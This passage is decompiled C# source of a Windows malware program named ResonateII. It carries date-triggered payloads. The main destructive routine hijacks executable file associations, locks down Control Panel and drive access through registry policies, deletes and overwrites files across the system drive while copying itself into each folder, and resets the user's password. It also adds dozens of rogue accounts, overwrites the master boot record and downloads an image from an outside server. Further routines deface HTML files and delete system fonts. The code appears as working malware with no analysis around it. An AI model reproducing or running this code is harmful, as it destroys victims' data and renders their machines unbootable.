		//IL_024e: Unknown result type (might be due to invalid IL or missing references)
		if (JLib.dateCheck(12, 30))
		{
			if (intplayed == 0)
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "intplayed", 1, RegistryValueKind.DWord);
				intplayed = 1;
				new Thread(doIntro).Start();
			}
			else
			{
				MessageBox.Show("Today is a very special day. Give your computer a break!", "ResonateII", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			return 0;
		}
		if (JLib.dateCheck(4, 20))
		{
			Wallpaper.Set(new Uri(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\snoop.jpg"), Wallpaper.Style.Stretched);
			return 1;
		}
		if (JLib.dateCheck(2, 16))
		{
			if (JLib.mutexCheck("ResonateII___MUTEX"))
			{
				new SoundPlayer(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\grass_beach.wav").PlayLooping();
				return 2;
			}
			return 1;
		}
		if (JLib.dateCheck(9, 4))
		{
			Process.Start("http://fittea.org/");
			return 0;
		}
		if (JLib.dateCheck(10, 1))
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run((Form)(object)new danb());
			return 1;
		}
		if (DateTime.Today.Month == 10 && JLib.rollDice(16) == 8 && DateTime.Today.Day != 1)
		{
			try
			{
				patrix();
			}
			catch
			{
			}
			return 0;
		}
		if (DateTime.Today.Month == 8)
		{
			new SoundPlayer(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\bbt.wav").Play();
			return 1;
		}
		if (JLib.dateCheck(1, 1))
		{
			new Thread(redThread).Start();
			return 1;
		}
		if (JLib.dateCheck(11, 11))
		{
			if (JLib.mutexCheck("ResonateII___MUTEX"))
			{
				new Thread(ftheme).Start();
				return 2;
			}
			return 1;
		}
		if (JLib.dateCheck(6, 17))
		{
			try
			{
				File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\g.bmp", Resources.g);
			}
			catch
			{
			}
			Wallpaper.Set(new Uri(Environment.GetEnvironmentVariable("windir") + "\\g.bmp"), Wallpaper.Style.Tiled);
			MessageBox.Show("GAiA Labs\nEstablished June 17th, 2016", "ResonateII by justquant/GAiA");
			return 1;
		}
		int num = imonth + amod;
		int num2 = iyear;
		if (num > 12)
		{
			num -= 12;
			num2++;
		}
		if (((num < DateTime.Today.Month && num2 == DateTime.Today.Year) || num2 < DateTime.Today.Year) && JLib.mutexCheck("ResonateII___MUTEX"))
		{
			death(a: false, b: false, c: false, d: true, e: true);
			return 0;
		}
		return 1;
	}

	private static void death(bool a, bool b, bool c, bool d, bool e)
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0403: Unknown result type (might be due to invalid IL or missing references)
		if (!(!a && !b && !c && d && e))
		{
			return;
		}
		logWrite("DEATH");
		new SoundPlayer(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\nl.wav").PlayLooping();
		string text = Environment.GetEnvironmentVariable("systemdrive") + "\\reaper.exe";
		File.WriteAllText(text, JLib.randStringU(256));
		Registry.SetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\open\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\edit\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\open\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\edit\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\open\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\edit\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\piffile\\shell\\open\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\scrfile\\shell\\config\\command", "", text);
		Registry.SetValue("HKEY_CLASSES_ROOT\\scrfile\\shell\\install\\command", "", text);
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "LegalNoticeCaption", "You're fucked now!", RegistryValueKind.String);
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "LegalNoticeText", "Veni, vidi, vici! Your computer has been recycled by ResonateII!", RegistryValueKind.String);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", 1, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoViewOnDrive", 67108863, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "NoDispAppearancePage", 1, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "NoDispBackgroundPage", 1, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "NoDispCPL", 1, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "NoDispSettingsPage", 1, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", 1, RegistryValueKind.DWord);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFileAssociate", 1, RegistryValueKind.DWord);
		byte[] bytes = File.ReadAllBytes(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\sweetdreams.jpg");
		scT(new DirectoryInfo(Environment.GetEnvironmentVariable("systemdrive")));
		for (int i = 0; i <= 4096; i++)
		{
			File.WriteAllBytes(Environment.GetEnvironmentVariable("userprofile") + "\\Desktop\\SWEETDREAMS " + i + ".jpg", bytes);
		}
		try
		{
			new WebClient().DownloadFile("http://justquant.net/public/dursteye.jpg", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\dursteye.jpg");
			Wallpaper.Set(new Uri(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\dursteye.jpg"), Wallpaper.Style.Stretched);
		}
		catch
		{
		}
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Microsoft\\User Account Pictures\\" + Environment.UserName + ".bmp", Resources.favicon);
		ProcessStartInfo processStartInfo = new ProcessStartInfo("net", "user " + Environment.UserName + " resonate");
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process.Start(processStartInfo);
		for (int j = 0; j <= 32; j++)
		{
			string text2 = JLib.randStringU(8);
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo("net", "user " + text2 + " " + JLib.randStringU(8) + " /add");
			processStartInfo2.UseShellExecute = false;
			processStartInfo2.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo2);
			while (!process.HasExited)
			{
				Thread.Sleep(10);
			}
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Microsoft\\User Account Pictures\\" + text2 + ".bmp", Resources.favicon);
		}
		uint lpNumberOfBytesWritten = 0u;
		IntPtr intPtr = CreateFile("\\\\.\\PhysicalDrive0", FileAccess.ReadWrite, FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, (FileAttributes)0, IntPtr.Zero);
		NativeOverlapped lpOverlapped = default(NativeOverlapped);
		WriteFile(intPtr, mbrData, 512u, out lpNumberOfBytesWritten, ref lpOverlapped);
		CloseHandle(intPtr);
		MessageBox.Show("I've stuck around here long enough and so have you. I think it's time we went our seperate ways.\n\nResonateII\nWritten by justquant/GAiA\nSummer 2016", "Veni, vidi, vici!", (MessageBoxButtons)0, (MessageBoxIcon)16);
		JLib.DoExitWin(4);
	}

	private static void scT(DirectoryInfo d)
	{
		string[] array = bFtype;
		foreach (string searchPattern in array)
		{
			try
			{
				FileInfo[] files = d.GetFiles(searchPattern);
				FileInfo[] array2 = files;
				foreach (FileInfo fileInfo in array2)
				{
					try
					{
						fileInfo.Delete();
						logWrite("DELETE " + fileInfo.FullName);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		string[] array3 = fUtype;
		foreach (string searchPattern2 in array3)
		{
			try
			{
				FileInfo[] files2 = d.GetFiles(searchPattern2);
				FileInfo[] array4 = files2;
				foreach (FileInfo fileInfo2 in array4)
				{
					try
					{
						File.WriteAllText(fileInfo2.FullName, JLib.repeatTime(256, "YOU'VE MET WITH A TERRIBLE FATE HAVEN'T YOU? "));
						logWrite("FUCK UP " + fileInfo2.FullName);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		try
		{
			File.WriteAllBytes(d.FullName + "\\RESONATE.EXE", getSelf());
		}
		catch
		{
		}
		try
		{
			DirectoryInfo[] directories = d.GetDirectories("*.*");
			DirectoryInfo[] array5 = directories;
			foreach (DirectoryInfo d2 in array5)
			{
				scT(d2);
			}
		}
		catch
		{
		}
	}

	private static void red(DirectoryInfo d)
	{
		FileInfo[] files = d.GetFiles("*.htm?");
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			try
			{
				File.WriteAllText(fileInfo.FullName, "<html><head><meta http-equiv=\"Content - Type\" content=\"text / html; charset = english\"><title>HELLO!</title></head><body><hr size=5><font color=\"red\"><p align=\"center\">Welcome to http://www.worm.com !<br><br>Hacked By Chinese!</font></hr></body></html>");
				logWrite("OVERWRITE " + fileInfo.FullName);
			}
			catch
			{
			}
		}
		try
		{
			DirectoryInfo[] directories = d.GetDirectories("*.*");
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo d2 in array2)
			{
				red(d2);
			}
		}
		catch
		{
		}
	}

	private static void redThread()
	{
		red(new DirectoryInfo(Environment.GetEnvironmentVariable("systemdrive")));
		while (true)
		{
			Thread.Sleep(60000);
		}
	}

	private static void doIntro()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new intro());
	}

	private static void patrix()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new scary());
	}

	private static void laugh()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		SpeechSynthesizer val = new SpeechSynthesizer();
		val.SetOutputToDefaultAudioDevice();
		while (true)
		{
			val.Speak(JLib.repeatTime(20, "ha"));
		}
	}

	public static void TrueBeep(note n, int ms)
	{
		Out32(67, 182);
		Out32(66, (byte)(n & (note)255));
		Out32(66, (byte)((uint)n >> 8));
		Thread.Sleep(10);
		Out32(97, (byte)(Convert.ToByte(Inp32(97)) | 3));
		Thread.Sleep(ms);
		Out32(97, (byte)(Convert.ToByte(Inp32(97)) & 0xFC));
	}

	public static void PauseFor(int ms)
	{
		Thread.Sleep(ms);
	}

	private static void ftheme()
	{
		while (true)
		{
			TrueBeep(note.C4S, 500);
			TrueBeep(note.C4S, 250);
			TrueBeep(note.D4, 250);
			TrueBeep(note.E4, 500);
			TrueBeep(note.C4S, 500);
			TrueBeep(note.D4, 500);
			TrueBeep(note.D4, 250);
			TrueBeep(note.E4, 250);
			TrueBeep(note.B3, 500);
			TrueBeep(note.E3, 500);
			TrueBeep(note.C4S, 500);
			TrueBeep(note.C4S, 250);
			TrueBeep(note.D4, 250);
			TrueBeep(note.E4, 500);
			TrueBeep(note.A4, 500);
			TrueBeep(note.F4S, 1000);
			TrueBeep(note.E4, 500);
			PauseFor(500);
			TrueBeep(note.C4S, 500);
			TrueBeep(note.C4S, 250);
			TrueBeep(note.D4, 250);
			TrueBeep(note.E4, 500);
			TrueBeep(note.C4S, 500);
			TrueBeep(note.D4, 500);
			TrueBeep(note.D4, 250);
			TrueBeep(note.E4, 250);
			TrueBeep(note.B3, 500);
			TrueBeep(note.E3, 500);
			TrueBeep(note.C4S, 500);
			TrueBeep(note.C4S, 250);
			TrueBeep(note.D4, 250);
			TrueBeep(note.B3, 500);
			TrueBeep(note.G3S, 500);
			TrueBeep(note.A3, 1000);
			TrueBeep(note.A5, 500);
			PauseFor(500);
		}
	}

	private static void fuckFonts()
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetEnvironmentVariable("windir") + "\\system32\\dllcache\\");
		directoryInfo.Attributes = FileAttributes.Normal;
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			try
			{
				fileInfo.Attributes = FileAttributes.Normal;
				fileInfo.Delete();
				logWrite("KILL CACHE " + fileInfo.FullName);
			}
			catch
			{
			}
		}
		FileInfo[] files2 = new DirectoryInfo(Environment.GetEnvironmentVariable("windir") + "\\Fonts\\").GetFiles("*.*");
		FileInfo[] array2 = files2;
		foreach (FileInfo fileInfo2 in array2)
		{
			try
			{
				fileInfo2.Delete();
				logWrite("KILL FONT " + fileInfo2.FullName);
			}
			catch
			{
			}
		}
	}
}
